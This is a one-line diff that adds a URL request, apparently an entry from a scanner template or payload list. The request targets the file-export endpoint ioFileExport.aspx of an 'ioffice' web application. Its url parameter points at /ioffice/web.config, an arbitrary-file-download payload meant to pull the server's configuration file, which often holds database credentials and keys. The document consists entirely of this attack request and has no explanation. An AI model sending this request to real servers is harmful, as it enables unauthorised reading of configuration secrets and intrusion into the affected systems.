@@ -1,0 +1,1 @@
+/ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/web.config&filename={{filename}}.txt&ContentType=application/octet-stream
